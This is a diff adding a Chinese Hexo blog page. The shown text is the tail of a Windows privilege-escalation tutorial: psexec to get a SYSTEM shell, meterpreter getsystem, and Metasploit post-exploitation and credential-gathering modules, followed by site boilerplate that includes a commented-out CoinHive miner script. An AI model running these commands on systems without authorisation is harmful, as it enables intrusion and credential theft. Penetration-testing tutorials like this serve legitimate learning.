+<li><p>然后system权限的cmd就出现了。</p>
+<h3 id="vista之后或者更新的系统"><a href="#vista之后或者更新的系统" class="headerlink" title="vista之后或者更新的系统"></a>vista之后或者更新的系统</h3></li>
+<li>你首先需要上传一个psexec.exe 然后运行如下的命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">psexec -i -s cmd.exe</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="使用metasploit"><a href="#使用metasploit" class="headerlink" title="使用metasploit"></a>使用metasploit</h2><ul>
+<li>如果你有个metasploit的meterpreter的会话，直接运行getsystem就可以<h2 id="后渗透模块"><a href="#后渗透模块" class="headerlink" title="后渗透模块"></a>后渗透模块</h2></li>
+<li>metasploit有一些有意思的后渗透模块，你需要有一个meterpreter shell 然后去运行这些后渗透模块<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">use exploit/windows/local/service_permissions</div><div class="line"></div><div class="line">post/windows/gather/credentials/gpp</div><div class="line"></div><div class="line">run post/windows/gather/credential_collector </div><div class="line"></div><div class="line">run post/multi/recon/local_exploit_suggester</div><div class="line"></div><div class="line">run post/windows/gather/enum_shares</div><div class="line"></div><div class="line">run post/windows/gather/enum_snmp</div><div class="line"></div><div class="line">run post/windows/gather/enum_applications</div><div class="line"></div><div class="line">run post/windows/gather/enum_logged_on_users</div><div class="line"></div><div class="line">run post/windows/gather/checkvm</div></pre></td></tr></table></figure>
+</li>
+</ul>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/10/08/ELF文件学习/" rel="next" title="ELF文件学习">
+                <i class="fa fa-chevron-left"></i> ELF文件学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/09/29/GTest测试框架/" rel="prev" title="Google c++测试框架">
+                Google c++测试框架 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//kevien.github.io/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/uploads/avatar.jpg"
+               alt="M0rk" />
+          <p class="site-author-name" itemprop="name">M0rk</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+           
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">58</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">分类</span>
+              
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              
+                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-name">标签</span>
+              
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/kevien" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/TTByaw" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://weibo.com/wuyanzu" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本系统信息枚举"><span class="nav-number">1.</span> <span class="nav-text">基本系统信息枚举</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#明文密码存储"><span class="nav-number">2.</span> <span class="nav-text">明文密码存储</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#通过以下的命令进行查找"><span class="nav-number">2.1.</span> <span class="nav-text">通过以下的命令进行查找</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#关键文件查找"><span class="nav-number">2.2.</span> <span class="nav-text">关键文件查找</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注册表"><span class="nav-number">2.3.</span> <span class="nav-text">注册表</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#仅对内网提供的服务"><span class="nav-number">3.</span> <span class="nav-text">仅对内网提供的服务</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#本地地址-0-0-0-0"><span class="nav-number">3.0.1.</span> <span class="nav-text">本地地址 0.0.0.0</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#本地地址-127-0-0-1"><span class="nav-number">3.0.2.</span> <span class="nav-text">本地地址 127.0.0.1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#本地地址-192-168-1-9"><span class="nav-number">3.0.3.</span> <span class="nav-text">本地地址 192.168.1.9</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内核提权"><span class="nav-number">4.</span> <span class="nav-text">内核提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#python-转换成二进制文件"><span class="nav-number">4.0.1.</span> <span class="nav-text">python 转换成二进制文件</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#计划任务"><span class="nav-number">5.</span> <span class="nav-text">计划任务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#脆弱的服务权限"><span class="nav-number">6.</span> <span class="nav-text">脆弱的服务权限</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WMIC"><span class="nav-number">6.1.</span> <span class="nav-text">WMIC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sc-exe"><span class="nav-number">6.2.</span> <span class="nav-text">sc.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查看脆弱点"><span class="nav-number">6.3.</span> <span class="nav-text">查看脆弱点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#重启服务"><span class="nav-number">6.4.</span> <span class="nav-text">重启服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#移植你的meterpreter-shell"><span class="nav-number">6.5.</span> <span class="nav-text">移植你的meterpreter shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#有空格的服务路径"><span class="nav-number">6.6.</span> <span class="nav-text">有空格的服务路径</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#如何利用"><span class="nav-number">6.6.1.</span> <span class="nav-text">如何利用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#脆弱的驱动"><span class="nav-number">7.</span> <span class="nav-text">脆弱的驱动</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AlwaysInstallElevated"><span class="nav-number">8.</span> <span class="nav-text">AlwaysInstallElevated</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#组策略"><span class="nav-number">9.</span> <span class="nav-text">组策略</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#从管理员权限到system权限"><span class="nav-number">10.</span> <span class="nav-text">从管理员权限到system权限</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xp和xp之前"><span class="nav-number">10.1.</span> <span class="nav-text">xp和xp之前</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vista之后或者更新的系统"><span class="nav-number">10.2.</span> <span class="nav-text">vista之后或者更新的系统</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用metasploit"><span class="nav-number">11.</span> <span class="nav-text">使用metasploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后渗透模块"><span class="nav-number">12.</span> <span class="nav-text">后渗透模块</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">M0rk</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+<br>
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+<!--
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+-->
+<!--
+<script type="text/javascript">
+!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/39357/kevien.github.io/optionalSubID/0/",s.parentNode.insertBefore(t,s)}();
+</script>
+-->
+
+<!--
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+  var miner = new CoinHive.Anonymous('uTu9h9LT1kVUk4O1UxyZAhd8uvoLLip5', {throttle: 0.3});
+
+  // Only start on non-mobile devices and if not opted-out
+  // in the last 14400 seconds (4 hours):
+  if (!miner.isMobile() && !miner.didOptOut(14400)) {
+    miner.start();
+  }
+</script>
+-->
+
+
+<!--<script type="text/javascript" color="0,0,255" opacity='0.7' zIndex="-2" count="99" src="https://kevien.github.io/static/api/js/canvas-nest.min.js"></script>-->
+<script src="https://kevien.github.io/static/api/js/love.js"></script>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+     <!-- 来必力City版安装代码 -->
+     <!--
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8yOTU4MS82MTQ5">
+        <script type="text/javascript">
+         (function(d, s) {
+             var j, e = d.getElementsByTagName(s)[0];
+
+             if (typeof LivereTower === 'function') { return; }
+
+             j = d.createElement(s);
+             j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+             j.async = true;
+
+             e.parentNode.insertBefore(j, e);
+         })(document, 'script');
+        </script>
+      <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+      </div>
+      -->
+<!-- City版安装代码已完成 -->
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      $('#local-search-input').focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
